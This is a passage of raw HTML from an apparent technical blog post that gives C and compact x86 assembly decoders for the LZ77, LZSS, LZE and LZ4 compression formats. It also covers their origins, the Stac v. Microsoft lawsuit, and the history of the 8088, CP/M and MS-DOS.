style=\"color: #A90D91;\">edi</span>, <span style=\"color: #A90D91;\">ebx</span>           <span style=\"color: #177500;\">; while (out &lt; end)</span>\n    <span style=\"color: #000000;\">jnb</span>    <span style=\"color: #000000;\">lz77_exit</span>\n    \n    <span style=\"color: #000000;\">lodsw</span>                     <span style=\"color: #177500;\">; ofs = *(uint16_t*)in;</span>\n    <span style=\"color: #000000;\">movzx</span>  <span style=\"color: #A90D91;\">ecx</span>, <span style=\"color: #A90D91;\">al</span>            <span style=\"color: #177500;\">; len = ofs &amp; 15;</span>\n    <span style=\"color: #000000;\">shr</span>    <span style=\"color: #A90D91;\">eax</span>, <span style=\"color: #1C01CE;\">4</span>             <span style=\"color: #177500;\">; ofs &gt;&gt;= 4;</span>\n    <span style=\"color: #000000;\">jz</span>     <span style=\"color: #000000;\">lz77_copybyte</span>\n    \n    <span style=\"color: #000000;\">and</span>    <span style=\"color: #A90D91;\">ecx</span>, <span style=\"color: #1C01CE;\">15</span>\n    <span style=\"color: #000000;\">inc</span>    <span style=\"color: #A90D91;\">ecx</span>                <span style=\"color: #177500;\">; len++;</span>\n    <span style=\"color: #000000;\">push</span>   <span style=\"color: #A90D91;\">esi</span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">esi</span>, <span style=\"color: #A90D91;\">edi</span>           <span style=\"color: #177500;\">; ptr = out - ofs;</span>\n    <span style=\"color: #000000;\">sub</span>    <span style=\"color: #A90D91;\">esi</span>, <span style=\"color: #A90D91;\">eax</span>           \n    <span style=\"color: #000000;\">rep</span>    <span style=\"color: #000000;\">movsb</span>              <span style=\"color: #177500;\">; while(len--) *out++ = *ptr++;</span>\n    <span style=\"color: #000000;\">pop</span>    <span style=\"color: #A90D91;\">esi</span>\n<span style=\"color: #000000;\">lz77_copybyte:</span>\n    <span style=\"color: #000000;\">movsb</span>                     <span style=\"color: #177500;\">; *out++ = *src++;</span>\n    <span style=\"color: #000000;\">jmp</span>    <span style=\"color: #000000;\">lz77_main</span>\n<span style=\"color: #000000;\">lz77_exit:</span>\n    <span style=\"color: #177500;\">; return (out - (uint8_t*)outbuf);</span>\n    <span style=\"color: #000000;\">sub</span>    <span style=\"color: #A90D91;\">edi</span>, [<span style=\"color: #A90D91;\">esp</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">32</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">4</span>]\n    <span style=\"color: #000000;\">mov</span>    [<span style=\"color: #A90D91;\">esp</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">28</span>], <span style=\"color: #A90D91;\">edi</span>\n    <span style=\"color: #000000;\">popad</span>\n    <span style=\"color: #000000;\">ret</span>\n    \n</pre>\n</div>\n<h2 id=\"lzss\">6. Lempel-Ziv-Storer-Szymanski (LZSS)</h2>\n<p>Designed by <a href=\"https://www.cs.brandeis.edu/~storer/\">James Storer</a>, <a href=\"https://dblp.org/pers/s/Szymanski:Thomas_G=.html\">Thomas Szymanski</a>, and described in <a href=\"https://dl.acm.org/doi/10.1145/322344.322346\">Data Compression via Textual Substitution</a> published in 1982. The match reference in the LZ77 decoder occupies 16-bits or two bytes even when no match exists. That means for every literal are two additional redundant bytes, which isn\u2019t very efficient. LZSS improves the LZ77 format by using one bit to distinguish between a match reference and a literal, and this improves the overall compression ratio. Introspec informed me via email the importance of this paper in describing the many variations of the original LZ77 scheme. Many of which remain unexplored. It also has an overview of the early literature, which is worth examining in more detail. <a href=\"https://oku.edu.mie-u.ac.jp/~okumura/\">Haruhiko Okumura</a> shared his <a href=\"https://oku.edu.mie-u.ac.jp/~okumura/compression/1988.html\">implementations</a> of LZSS via a BBS in 1988, and this inspired the development of various executable compressors released in the late 1980s and 1990s. The following decoder works with <a href=\"https://github.com/kieselsteini/lzss\">a compressor</a> by <a href=\"https://github.com/kieselsteini\">Sebastian Steinhauer</a>.</p>\n<div class=\"highlight\" style=\"background: #ffffff;\">\n<pre style=\"line-height: 125%;\"><span></span><span style=\"color: #888888;\">// to keep track of flags</span>\n<span style=\"color: #008800; font-weight: bold;\">typedef</span> <span style=\"color: #008800; font-weight: bold;\">struct</span> _lzss_ctx_t {\n    <span style=\"color: #333399; font-weight: bold;\">uint8_t</span> w;\n    <span style=\"color: #333399; font-weight: bold;\">uint8_t</span> <span style=\"color: #333333;\">*</span>in;\n} lzss_ctx;\n\n<span style=\"color: #888888;\">// read a bit</span>\n<span style=\"color: #333399; font-weight: bold;\">uint8_t</span> <span style=\"color: #0066BB; font-weight: bold;\">get_bit</span>(lzss_ctx <span style=\"color: #333333;\">*</span>c) {\n    <span style=\"color: #333399; font-weight: bold;\">uint8_t</span> x;\n    \n    x <span style=\"color: #333333;\">=</span> c<span style=\"color: #333333;\">-&gt;</span>w;\n    c<span style=\"color: #333333;\">-&gt;</span>w <span style=\"color: #333333;\">&lt;&lt;=</span> <span style=\"color: #0000DD; font-weight: bold;\">1</span>;\n    \n    <span style=\"color: #008800; font-weight: bold;\">if</span>(c<span style=\"color: #333333;\">-&gt;</span>w <span style=\"color: #333333;\">==</span> <span style=\"color: #0000DD; font-weight: bold;\">0</span>) {\n      x <span style=\"color: #333333;\">=</span> <span style=\"color: #333333;\">*</span>c<span style=\"color: #333333;\">-&gt;</span>in<span style=\"color: #333333;\">++</span>;\n      c<span style=\"color: #333333;\">-&gt;</span>w <span style=\"color: #333333;\">=</span> (x <span style=\"color: #333333;\">&lt;&lt;</span> <span style=\"color: #0000DD; font-weight: bold;\">1</span>) <span style=\"color: #333333;\">|</span> <span style=\"color: #0000DD; font-weight: bold;\">1</span>;\n    }\n    <span style=\"color: #008800; font-weight: bold;\">return</span> x <span style=\"color: #333333;\">&gt;&gt;</span> <span style=\"color: #0000DD; font-weight: bold;\">7</span>;\n}\n\n<span style=\"color: #333399; font-weight: bold;\">uint32_t</span> <span style=\"color: #0066BB; font-weight: bold;\">lzss_depack</span>(\n  <span style=\"color: #333399; font-weight: bold;\">void</span> <span style=\"color: #333333;\">*</span>outbuf, \n  <span style=\"color: #333399; font-weight: bold;\">uint32_t</span> outlen, \n  <span style=\"color: #008800; font-weight: bold;\">const</span> <span style=\"color: #333399; font-weight: bold;\">void</span> <span style=\"color: #333333;\">*</span>inbuf) \n{\n    <span style=\"color: #333399; font-weight: bold;\">uint8_t</span>  <span style=\"color: #333333;\">*</span>out, <span style=\"color: #333333;\">*</span>end, <span style=\"color: #333333;\">*</span>ptr;\n    <span style=\"color: #333399; font-weight: bold;\">uint32_t</span> i, ofs, len;\n    lzss_ctx c;\n    \n    <span style=\"color: #888888;\">// initialize pointers</span>\n    out <span style=\"color: #333333;\">=</span> (<span style=\"color: #333399; font-weight: bold;\">uint8_t</span><span style=\"color: #333333;\">*</span>)outbuf;\n    end <span style=\"color: #333333;\">=</span> out <span style=\"color: #333333;\">+</span> outlen;\n    \n    <span style=\"color: #888888;\">// initialize context</span>\n    c.in <span style=\"color: #333333;\">=</span> (<span style=\"color: #333399; font-weight: bold;\">uint8_t</span><span style=\"color: #333333;\">*</span>)inbuf;\n    c.w  <span style=\"color: #333333;\">=</span> <span style=\"color: #0000DD; font-weight: bold;\">128</span>;\n    \n    <span style=\"color: #008800; font-weight: bold;\">while</span>(out <span style=\"color: #333333;\">&lt;</span> end) {\n      <span style=\"color: #888888;\">// if bit is not set</span>\n      <span style=\"color: #008800; font-weight: bold;\">if</span>(<span style=\"color: #333333;\">!</span>get_bit(<span style=\"color: #333333;\">&amp;</span>c)) {\n        <span style=\"color: #888888;\">// store literal</span>\n        <span style=\"color: #333333;\">*</span>out<span style=\"color: #333333;\">++</span> <span style=\"color: #333333;\">=</span> <span style=\"color: #333333;\">*</span>c.in<span style=\"color: #333333;\">++</span>;\n      } <span style=\"color: #008800; font-weight: bold;\">else</span> {\n        <span style=\"color: #888888;\">// decode offset and length</span>\n        ofs <span style=\"color: #333333;\">=</span> <span style=\"color: #333333;\">*</span>(<span style=\"color: #333399; font-weight: bold;\">uint16_t</span><span style=\"color: #333333;\">*</span>)c.in;\n        c.in <span style=\"color: #333333;\">+=</span> <span style=\"color: #0000DD; font-weight: bold;\">2</span>;\n        len <span style=\"color: #333333;\">=</span> (ofs <span style=\"color: #333333;\">&amp;</span> <span style=\"color: #0000DD; font-weight: bold;\">15</span>) <span style=\"color: #333333;\">+</span> <span style=\"color: #0000DD; font-weight: bold;\">3</span>;\n        ofs <span style=\"color: #333333;\">&gt;&gt;=</span> <span style=\"color: #0000DD; font-weight: bold;\">4</span>;\n        ptr <span style=\"color: #333333;\">=</span> out <span style=\"color: #333333;\">-</span> ofs <span style=\"color: #333333;\">-</span> <span style=\"color: #0000DD; font-weight: bold;\">1</span>;\n        <span style=\"color: #888888;\">// copy bytes</span>\n        <span style=\"color: #008800; font-weight: bold;\">while</span>(len<span style=\"color: #333333;\">--</span>) <span style=\"color: #333333;\">*</span>out<span style=\"color: #333333;\">++</span> <span style=\"color: #333333;\">=</span> <span style=\"color: #333333;\">*</span>ptr<span style=\"color: #333333;\">++</span>;\n      }\n    }\n    <span style=\"color: #888888;\">// return length</span>\n    <span style=\"color: #008800; font-weight: bold;\">return</span> (out <span style=\"color: #333333;\">-</span> (<span style=\"color: #333399; font-weight: bold;\">uint8_t</span><span style=\"color: #333333;\">*</span>)outbuf);\n}\n</pre>\n</div>\n<p>The assembly is a straight forward translation of the C code, currently at 69 bytes.</p>\n<div class=\"highlight\" style=\"background: #ffffff;\">\n<pre style=\"line-height: 125%;\"><span></span><span style=\"color: #000000;\">lzss_depackx:</span>\n<span style=\"color: #000000;\">_lzss_depackx:</span>\n    <span style=\"color: #000000;\">pushad</span>\n    \n    <span style=\"color: #000000;\">lea</span>    <span style=\"color: #A90D91;\">esi</span>, [<span style=\"color: #A90D91;\">esp</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">32</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">4</span>]\n    <span style=\"color: #000000;\">lodsd</span>\n    <span style=\"color: #000000;\">xchg</span>   <span style=\"color: #A90D91;\">edi</span>, <span style=\"color: #A90D91;\">eax</span>          <span style=\"color: #177500;\">; edi = outbuf</span>\n    <span style=\"color: #000000;\">lodsd</span>\n    <span style=\"color: #000000;\">lea</span>    <span style=\"color: #A90D91;\">ebx</span>, [<span style=\"color: #A90D91;\">edi</span><span style=\"color: #000000;\">+</span><span style=\"color: #A90D91;\">eax</span>]    <span style=\"color: #177500;\">; ebx = edi + outlen</span>\n    <span style=\"color: #000000;\">lodsd</span>\n    <span style=\"color: #000000;\">xchg</span>   <span style=\"color: #A90D91;\">esi</span>, <span style=\"color: #A90D91;\">eax</span>          <span style=\"color: #177500;\">; esi = inbuf</span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">al</span>, <span style=\"color: #1C01CE;\">128</span>           <span style=\"color: #177500;\">; set flags</span>\n<span style=\"color: #000000;\">lzss_main:</span>\n    <span style=\"color: #000000;\">cmp</span>    <span style=\"color: #A90D91;\">edi</span>, <span style=\"color: #A90D91;\">ebx</span>          <span style=\"color: #177500;\">; while(out &lt; end)</span>\n    <span style=\"color: #000000;\">jnb</span>    <span style=\"color: #000000;\">lzss_exit</span>\n    \n    <span style=\"color: #000000;\">add</span>    <span style=\"color: #A90D91;\">al</span>, <span style=\"color: #A90D91;\">al</span>            <span style=\"color: #177500;\">; c-&gt;w &lt;&lt;= 1</span>\n    <span style=\"color: #000000;\">jnz</span>    <span style=\"color: #000000;\">lzss_check_bit</span>\n    \n    <span style=\"color: #000000;\">lodsb</span>                    <span style=\"color: #177500;\">; c-&gt;w = *c-&gt;in++;</span>\n    <span style=\"color: #000000;\">adc</span>    <span style=\"color: #A90D91;\">al</span>, <span style=\"color: #A90D91;\">al</span>\n<span style=\"color: #000000;\">lzss_check_bit:</span>\n    <span style=\"color: #000000;\">jc</span>     <span style=\"color: #000000;\">read_pair</span>         <span style=\"color: #177500;\">; if bit set, read len,offset</span>\n    \n    <span style=\"color: #000000;\">movsb</span>                    <span style=\"color: #177500;\">; *out++ = *c.in++;</span>\n    <span style=\"color: #000000;\">jmp</span>    <span style=\"color: #000000;\">lzss_main</span>\n<span style=\"color: #000000;\">read_pair:</span>\n    <span style=\"color: #000000;\">movzx</span>  <span style=\"color: #A90D91;\">edx</span>, <span style=\"color: #A90D91;\">word</span>[<span style=\"color: #A90D91;\">esi</span>]    <span style=\"color: #177500;\">; ofs = *(uint16_t*)c.in;</span>\n    <span style=\"color: #000000;\">add</span>    <span style=\"color: #A90D91;\">esi</span>, <span style=\"color: #1C01CE;\">2</span>            <span style=\"color: #177500;\">; c.in += 2;</span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">ecx</span>, <span style=\"color: #A90D91;\">edx</span>          <span style=\"color: #177500;\">; len = (ofs % LEN_SIZE) + LEN_MIN;</span>\n    <span style=\"color: #000000;\">and</span>    <span style=\"color: #A90D91;\">ecx</span>, <span style=\"color: #1C01CE;\">15</span>           <span style=\"color: #177500;\">;</span>\n    <span style=\"color: #000000;\">add</span>    <span style=\"color: #A90D91;\">ecx</span>, <span style=\"color: #1C01CE;\">3</span>            <span style=\"color: #177500;\">;</span>\n    <span style=\"color: #000000;\">shr</span>    <span style=\"color: #A90D91;\">edx</span>, <span style=\"color: #1C01CE;\">4</span>            <span style=\"color: #177500;\">; ofs &gt;&gt;= 4</span>\n    <span style=\"color: #000000;\">push</span>   <span style=\"color: #A90D91;\">esi</span>\n    <span style=\"color: #000000;\">lea</span>    <span style=\"color: #A90D91;\">esi</span>, [<span style=\"color: #A90D91;\">edi</span><span style=\"color: #000000;\">-</span><span style=\"color: #1C01CE;\">1</span>]      <span style=\"color: #177500;\">; ptr = out - ofs - 1;</span>\n    <span style=\"color: #000000;\">sub</span>    <span style=\"color: #A90D91;\">esi</span>, <span style=\"color: #A90D91;\">edx</span>          <span style=\"color: #177500;\">;</span>\n    <span style=\"color: #000000;\">rep</span>    <span style=\"color: #000000;\">movsb</span>             <span style=\"color: #177500;\">; while(len--) *out++ = *ptr++;</span>\n    <span style=\"color: #000000;\">pop</span>    <span style=\"color: #A90D91;\">esi</span>\n    <span style=\"color: #000000;\">jmp</span>    <span style=\"color: #000000;\">lzss_main</span>\n<span style=\"color: #000000;\">lzss_exit:</span>\n    <span style=\"color: #177500;\">; return (out - (uint8_t*)outbuf);</span>\n    <span style=\"color: #000000;\">sub</span>    <span style=\"color: #A90D91;\">edi</span>, [<span style=\"color: #A90D91;\">esp</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">32</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">4</span>]\n    <span style=\"color: #000000;\">mov</span>    [<span style=\"color: #A90D91;\">esp</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">28</span>], <span style=\"color: #A90D91;\">edi</span>\n    <span style=\"color: #000000;\">popad</span>\n    <span style=\"color: #000000;\">ret</span>\n</pre>\n</div>\n<h2 id=\"lzb\">7. Lempel-Ziv-Bell (LZB)</h2>\n<p>Designed by <a href=\"http://www.cosc.canterbury.ac.nz/tim.bell/\">Tim Bell</a> and described in his 1986 Ph.D. dissertation <a href=\"https://ir.canterbury.ac.nz/handle/10092/8411\">A Unifying Theory and Improvements for Existing Approaches to Text Compression</a>. It uses a pre-processor based on LZSS and Elias gamma coding of the match length, which results in a compression ratio similar to <a href=\"https://oku.edu.mie-u.ac.jp/~okumura/compression/history.html\">LZH and LZARI</a> by Okumura. However, it does not suffer the performance penalty of using Huffman or arithmetic coding. Introspec considers it to be the first implementation that uses variable-length coding for reference matches, which is the basis for most modern LZ77-style compressors.</p>\n<p>A key exhibit in a $300 million lawsuit brought by Stac Electronics (SE) against Microsoft was Bell&#8217;s thesis. The 1993 case centered around a disk compression utility included with MS-DOS 6.0 called <a href=\"http://www.techhelpmanual.com/787-doublespace_overview.html\">DoubleSpace</a>. <a href=\"https://web.archive.org/web/20070509205650/http://www.vaxxine.com/lawyers/articles/stac.html\">SE accused Microsoft of patent violations</a> by using the same compression technologies used in its Stacker product. The courts agreed, and <a href=\"https://www.latimes.com/archives/la-xpm-1994-02-24-fi-26671-story.html\">SE were awarded $120 million in compensatory damages</a>.</p>\n<h2 id=\"8088\">8. Intel 8088 / 8086</h2>\n<p>For many years, bigger nerds than myself would remind me of what a mediocre architecture the x86 is and that it didn&#8217;t deserve to be the most popular CPU for personal computers. But if it&#8217;s so bad, how did it become the predominant architecture? It probably commenced in the 1970s with the release of the 8080, and an operating system designed for it by <a href=\"https://computerhistory.org/blog/in-his-own-words-gary-kildall/\">Gary Kildall</a>  called Control Program Monitor or Control Program for Microcomputers (CP/M).</p>\n<table id=\"t03\">\n<tr>\n<th>Year</th>\n<th>Model</th>\n<th>Data Width (bits)</th>\n<th>Address Width (bits)</th>\n</tr>\n<tr>\n<td>1971</td>\n<td><a href=\"http://www.cpu-world.com/CPUs/4004/index.html\">4004</a></td>\n<td>4</td>\n<td>12</td>\n</tr>\n<tr>\n<td>1972</td>\n<td><a href=\"http://www.cpu-world.com/CPUs/8008/index.html\">8008</a></td>\n<td>8</td>\n<td>14</td>\n</tr>\n<tr>\n<td>1974</td>\n<td><a href=\"http://www.cpu-world.com/CPUs/4040/index.html\">4040</a></td>\n<td>4</td>\n<td>12</td>\n</tr>\n<tr>\n<td>1974</td>\n<td><a href=\"http://www.cpu-world.com/CPUs/8080/index.html\">8080</a></td>\n<td>8</td>\n<td>16</td>\n</tr>\n<tr>\n<td>1976</td>\n<td><a href=\"http://www.cpu-world.com/CPUs/8085/index.html\">8085</a></td>\n<td>8</td>\n<td>16</td>\n</tr>\n<tr>\n<td>1978</td>\n<td><a href=\"http://www.cpu-world.com/CPUs/8086/index.html\">8086</a></td>\n<td>16</td>\n<td>20</td>\n</tr>\n<tr>\n<td>1979</td>\n<td><a href=\"http://www.cpu-world.com/CPUs/8088/index.html\">8088</a></td>\n<td>8</td>\n<td>20</td>\n</tr>\n</table>\n<p><a href=\"https://www.youtube.com/watch?v=sDIK-C6dGks\">Kildall</a> initially designed and developed CP/M for the 8-Bit 8080 and licensed it to run devices such as the <a href=\"https://www.imsai.net/\">IMSAI 8080</a> (seen in the movie <a href=\"https://www.imdb.com/title/tt0086567/\">Wargames</a>). Kildall was motivated by the enormous potential for microcomputers to become regular home appliances. And when IBM wanted to build a microcomputer of its own in 1980, CP/M was the most successful operating system on the market.</p>\n<p>IBM made two decisions: use the existing software and hardware for the 8085-based <a href=\"http://oldcomputers.net/ibm5322.html\">IBM System/23</a> by using the 8088 instead of the 8086. (the cost per CPU unit was also a factor); and use its product to run CP/M to remain competitive with other microcomputers on the market.</p>\n<p>Regrettably, Kildall missed a unique opportunity to supply CP/M for the IBM Personal Computer. Instead, <a href=\"https://www.youtube.com/watch?v=aQkn24he2rY\">Bill Gates / Microsoft</a> obtained licensing to use a cloned version of CP/M called the <a href=\"https://en.wikipedia.org/wiki/86-DOS\">Quick and Dirty Operating System</a> (QDOS). QDOS was later rebranded to 86-DOS, before being shipped with the first IBM PC as &#8220;IBM PC DOS&#8221;. Microsoft later purchased 86-DOS, rebranded it Microsoft Disk Operating System (MS-DOS), and forced IBM into a licensing agreement so Microsoft were free to sell MS-DOS to other companies. Kildall would later remark in his unpublished memoir <a href=\"https://d1yx3ys82bpsa0.cloudfront.net/kildall-p.1-78-publishable-lowres.pdf\">Computer Connections, People, Places, and Events in the Evolution of the Personal Computer Industry.</a> that <strong>&#8220;Gates is more an opportunist than a technical type and severely opinionated even when the opinion he holds is absurd.&#8221;</strong></p>\n<ul>\n<li><a href=\"https://archive.seattletimes.com/archive/?date=19940714&amp;slug=1920286\">A Career Spent In Gates&#8217; Shadow &#8212; Computer Pioneer Dies At 52</a></li>\n<li><a href=\"https://www.theregister.co.uk/2007/07/30/msdos_paternity_suit_resolved/\">MS-DOS paternity suit settled</a></li>\n<li><a href=\"https://www.theregister.co.uk/2012/08/07/kildall_unforensic_ieee_smear/\">Bill Gates, Harry Evans and the smearing of a computer legend</a></li>\n<li><a href=\"https://www.theregister.co.uk/2016/08/04/pc_pioneer_gary_kildalls_unpublished_memoir_revealed/\">PC pioneer Gary Kildall&#8217;s unpublished memoir revealed</a></li>\n</ul>\n<h2 id=\"lze\">8.1 LZE</h2>\n<p>Designed by <a href=\"https://bellard.org/\">Fabrice Bellard</a> in 1989 and included in the closed-source MS-DOS packer <a href=\"https://bellard.org/lzexe.html\">LZEXE</a> by the same.  Inspired by LZSS but provides a higher compression ratio. <a href=\"https://github.com/gorry\">Hiroaki Goto</a> reverse engineered this in 1995 and published an <a href=\"http://gorry.haun.org/pw/index.php?lze\">open-source</a> implementation in 2008. The following is a 32-Bit translation of the 16-Bit decoder with some additional optimizations. There\u2019s also a 68K version for anyone interested and a <a href=\"https://github.com/uniabis/lzee\">Z80 version</a> by <a href=\"https://twitter.com/kmoroboshi\">Kei Moroboshi</a> published in 2017.</p>\n<div class=\"highlight\" style=\"background: #ffffff;\">\n<pre style=\"line-height: 125%;\"><span></span><span style=\"color: #000000;\">lze_depack:</span>\n<span style=\"color: #000000;\">_lze_depack:</span>\n    <span style=\"color: #000000;\">pushad</span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">edi</span>, [<span style=\"color: #A90D91;\">esp</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">32</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">4</span>] <span style=\"color: #177500;\">; edi = out</span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">esi</span>, [<span style=\"color: #A90D91;\">esp</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">32</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">8</span>] <span style=\"color: #177500;\">; esi = in</span>\n    \n    <span style=\"color: #000000;\">call</span>   <span style=\"color: #000000;\">init_get_bit</span>\n<span style=\"color: #000000;\">lze_get_bit:</span>  \n    <span style=\"color: #000000;\">add</span>    <span style=\"color: #A90D91;\">dl</span>, <span style=\"color: #A90D91;\">dl</span>            <span style=\"color: #177500;\">; </span>\n    <span style=\"color: #000000;\">jnz</span>    <span style=\"color: #000000;\">exit_get_bit</span>\n    \n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">dl</span>, [<span style=\"color: #A90D91;\">esi</span>]         <span style=\"color: #177500;\">; dl = *src++;</span>\n    <span style=\"color: #000000;\">inc</span>    <span style=\"color: #A90D91;\">esi</span>\n    <span style=\"color: #000000;\">rcl</span>    <span style=\"color: #A90D91;\">dl</span>, <span style=\"color: #1C01CE;\">1</span>\n<span style=\"color: #000000;\">exit_get_bit:</span>\n    <span style=\"color: #000000;\">ret</span>\n<span style=\"color: #000000;\">init_get_bit:</span>\n    <span style=\"color: #000000;\">pop</span>    <span style=\"color: #A90D91;\">ebp</span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">dl</span>, <span style=\"color: #1C01CE;\">128</span>\n<span style=\"color: #000000;\">lze_cl:</span>\n    <span style=\"color: #000000;\">movsb</span>\n<span style=\"color: #000000;\">lze_main:</span>\n    <span style=\"color: #000000;\">call</span>   <span style=\"color: #A90D91;\">ebp</span>               <span style=\"color: #177500;\">; if(get_bit()) continue;</span>\n    <span style=\"color: #000000;\">jc</span>     <span style=\"color: #000000;\">lze_cl</span>\n    \n    <span style=\"color: #000000;\">call</span>   <span style=\"color: #A90D91;\">ebp</span>               <span style=\"color: #177500;\">; if(get_bit()) {</span>\n    <span style=\"color: #000000;\">jc</span>     <span style=\"color: #000000;\">lze_copy3</span>\n    \n    <span style=\"color: #000000;\">xor</span>    <span style=\"color: #A90D91;\">ecx</span>, <span style=\"color: #A90D91;\">ecx</span>          <span style=\"color: #177500;\">; len = 0</span>\n    \n    <span style=\"color: #000000;\">call</span>   <span style=\"color: #A90D91;\">ebp</span>               <span style=\"color: #177500;\">; get_bit()</span>\n    <span style=\"color: #000000;\">adc</span>    <span style=\"color: #A90D91;\">ecx</span>, <span style=\"color: #A90D91;\">ecx</span>\n    \n    <span style=\"color: #000000;\">call</span>   <span style=\"color: #A90D91;\">ebp</span>               <span style=\"color: #177500;\">; get_bit()</span>\n    <span style=\"color: #000000;\">adc</span>    <span style=\"color: #A90D91;\">ecx</span>, <span style=\"color: #A90D91;\">ecx</span>\n    \n    <span style=\"color: #000000;\">lodsb</span>                    <span style=\"color: #177500;\">; a.b[0] = *in++;</span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">ah</span>, <span style=\"color: #000000;\">-</span><span style=\"color: #1C01CE;\">1</span>            <span style=\"color: #177500;\">; a.b[1] = 0xFF;</span>\n<span style=\"color: #000000;\">lze_copy1:</span>\n    <span style=\"color: #000000;\">inc</span>    <span style=\"color: #A90D91;\">ecx</span>               <span style=\"color: #177500;\">; len++;</span>\n    <span style=\"color: #000000;\">jmp</span>    <span style=\"color: #000000;\">lze_copy2</span>\n<span style=\"color: #000000;\">lze_copy3:</span>                   <span style=\"color: #177500;\">; else</span>\n    <span style=\"color: #000000;\">lodsw</span>\n    <span style=\"color: #000000;\">xchg</span>   <span style=\"color: #A90D91;\">al</span>, <span style=\"color: #A90D91;\">ah</span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">ecx</span>, <span style=\"color: #A90D91;\">eax</span>\n    <span style=\"color: #000000;\">shr</span>    <span style=\"color: #A90D91;\">eax</span>, <span style=\"color: #1C01CE;\">3</span>            <span style=\"color: #177500;\">; ofs /= 8</span>\n    <span style=\"color: #000000;\">or</span>     <span style=\"color: #A90D91;\">ah</span>, <span style=\"color: #1C01CE;\">0e0h</span>\n    <span style=\"color: #000000;\">and</span>    <span style=\"color: #A90D91;\">ecx</span>, <span style=\"color: #1C01CE;\">7</span>            <span style=\"color: #177500;\">; len %= 8</span>\n    <span style=\"color: #000000;\">jnz</span>    <span style=\"color: #000000;\">lze_copy1</span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">cl</span>, [<span style=\"color: #A90D91;\">esi</span>]         <span style=\"color: #177500;\">; len = *src++;</span>\n    <span style=\"color: #000000;\">inc</span>    <span style=\"color: #A90D91;\">esi</span>\n    <span style=\"color: #177500;\">; EOF?</span>\n    <span style=\"color: #000000;\">jecxz</span>  <span style=\"color: #000000;\">lze_exit</span>          <span style=\"color: #177500;\">; if(len == 0) break;</span>\n<span style=\"color: #000000;\">lze_copy2:</span>\n    <span style=\"color: #000000;\">movsx</span>  <span style=\"color: #A90D91;\">eax</span>, <span style=\"color: #A90D91;\">ax</span>\n    <span style=\"color: #000000;\">push</span>   <span style=\"color: #A90D91;\">esi</span>\n    <span style=\"color: #000000;\">lea</span>    <span style=\"color: #A90D91;\">esi</span>, [<span style=\"color: #A90D91;\">edi</span><span style=\"color: #000000;\">+</span><span style=\"color: #A90D91;\">eax</span>]\n    <span style=\"color: #000000;\">inc</span>    <span style=\"color: #A90D91;\">ecx</span>\n    <span style=\"color: #000000;\">rep</span>    <span style=\"color: #000000;\">movsb</span>\n    <span style=\"color: #000000;\">pop</span>    <span style=\"color: #A90D91;\">esi</span>\n    <span style=\"color: #000000;\">jmp</span>    <span style=\"color: #000000;\">lze_main</span>\n    <span style=\"color: #177500;\">; return (out - (uint8_t*)outbuf);</span>\n<span style=\"color: #000000;\">lze_exit:</span>\n    <span style=\"color: #000000;\">sub</span>    <span style=\"color: #A90D91;\">edi</span>, [<span style=\"color: #A90D91;\">esp</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">32</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">4</span>]\n    <span style=\"color: #000000;\">mov</span>    [<span style=\"color: #A90D91;\">esp</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">28</span>], <span style=\"color: #A90D91;\">edi</span>\n    <span style=\"color: #000000;\">popad</span>\n    <span style=\"color: #000000;\">ret</span>\n</pre>\n</div>\n<h2 id=\"lz4\">8.2 LZ4</h2>\n<p>Designed by <a href=\"https://twitter.com/cyan4973\">Yann Collet</a> and <a href=\"https://lz4.github.io/lz4/\">published in 2011</a>. <a href=\"https://github.com/lz4\">LZ4</a> is fast for both compression and decompression with a small decoder. Speed is somewhere between <a href=\"https://tools.ietf.org/rfc/rfc1951.txt\">DEFLATE</a> and <a href=\"http://www.oberhumer.com/opensource/lzo/\">LZO</a>, while the compression ratio is similar to LZO but worse than DEFLATE. Despite the compression ratio being worse than DEFLATE, LZ4 doesn\u2019t require a Huffman or arithmetic/range decoder. The following 32-Bit code is a conversion of the <a href=\"http://www.oldskool.org/pc/lz4_8088/\">8088/8086 implementation</a> by <a href=\"https://twitter.com/mobygamer\">Trixter</a>. <a href=\"https://twitter.com/twibsen\">J\u00f8rgen Ibsen</a> has implemented <a href=\"https://github.com/jibsen/blz4\">LZ4 with optimal parsing</a> using <a href=\"https://github.com/jibsen/brieflz\">BriefLZ algorithms.</a></p>\n<div class=\"highlight\" style=\"background: #ffffff;\">\n<pre style=\"line-height: 125%;\"><span></span><span style=\"color: #000000;\">lz4_depack:</span>\n<span style=\"color: #000000;\">_lz4_depack:</span>\n    <span style=\"color: #000000;\">pushad</span>\n    <span style=\"color: #000000;\">lea</span>     <span style=\"color: #A90D91;\">esi</span>,[<span style=\"color: #A90D91;\">esp</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">32</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">4</span>]\n    <span style=\"color: #000000;\">lodsd</span>                   <span style=\"color: #177500;\">;load target buffer</span>\n    <span style=\"color: #000000;\">xchg</span>    <span 